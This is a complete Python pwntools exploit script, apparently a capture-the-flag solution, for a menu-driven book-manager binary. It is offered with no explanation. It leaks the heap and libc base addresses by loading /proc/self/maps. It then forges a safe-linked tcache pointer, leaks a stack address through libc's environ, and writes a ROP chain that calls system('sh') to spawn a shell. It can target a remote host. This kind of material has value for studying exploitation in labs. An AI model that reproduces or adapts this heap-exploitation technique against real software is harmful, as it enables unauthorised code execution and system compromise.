#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("./pwn")
libc = e.libc
gs = """
set max-visualize-chunk-size 0x100
b *main+519
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def insert(value: int, name: bytes, context_size: int, context: bytes):
    p.sendlineafter(b"Enter your choice: ", b"1")
    p.sendlineafter(b'Enter the value: ', str(value).encode())
    p.sendafter(b'Enter the book name: ', name)
    p.sendlineafter(b'Enter the context size: ', str(context_size).encode())
    p.sendafter(b'Enter the context: ', context)


def delete(idx):
    p.sendlineafter(b"Enter your choice: ", b"2")
    p.sendlineafter(b"Enter the index: ", str(idx).encode())


def sort():
    p.sendlineafter(b"Enter your choice: ", b"3")


def load(filename):
    p.sendlineafter(b"Enter your choice: ", b"4")
    p.sendlineafter(b"Enter the file name: ", filename)


def save(idx):
    p.sendlineafter(b"Enter your choice: ", b"5")
    p.sendlineafter(b"Enter the book idx: ", str(idx).encode())


def show(idx):
    p.sendlineafter(b"Enter your choice: ", b"6")
    p.sendlineafter(b"Enter the book idx: ", str(idx).encode())


p.sendafter(b'Enter your name: ', b'X'*0x10)

load(b'/proc/self/maps')
show(1)

for i in range(0x10):
    # print(i)
    # print(p.recvline())
    res = p.recvline()
    if b"heap" in res:
        heap_base = int(res.split(b"-")[0], 16)
        # break
    if b"libc.so.6" in res:
        libc.address = int(res.split(b"-")[0], 16)
        break

log.success(hex(heap_base))
log.success((hex(libc.address)))

delete(1)
insert(0, "book1", 0x3c8-1, '-'*0x3c7)
delete(1)

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

_ = ((heap_base+0x122b0) >> 12) ^ (heap_base+0x10)  # tcache
insert(_, 'b', 0x10, '.'*0xf)
for i in range(0x18-1):
    insert(0, "a", 0x10, chr(0x41+i).encode()*0xf)

insert(0, "book1", 0x3c8-1, '-'*0x3c7)

tcache = p16(0)*((0x80-0x20) // 0x10) + p16(1)
tcache = tcache.ljust(64*2, b'\0')
tcache += (p64(0)*((0x80-0x20) // 0x10) +
           p64(libc.sym.environ-0x10)).ljust(64*8, b'\0')

insert(0, "book2", 0x3c8-1, tcache)
insert(0, "hehe", 0x80-8-1, b'A'*0x10)
show(0x18+3)
p.recvuntil(b'A'*0x10)
save_retn = u64(p.recv(6)+b'\0\0')-0x120
log.success(hex(save_retn))

delete(0x18+2)

tcache = p16(0)*((0x90-0x20) // 0x10) + p16(1)
tcache = tcache.ljust(64*2, b'\0')
tcache += (p64(0)*((0x90-0x20) // 0x10) +
           p64(save_retn-8)).ljust(64*8, b'\0')

insert(0, "book3", 0x290-8-1, tcache[:0x290-8-1])
insert(0, "rop", 0x90-8 - 1,
       p64(0) +
       p64(libc.address+0x000000000002a3e5) +
       p64(next(libc.search(b'sh\0'))) +
       p64(libc.address+0x000000000002a3e6) +
       p64(libc.sym.system)
       )

p.sendlineafter(b"Enter your choice: ", b"7")

p.interactive()
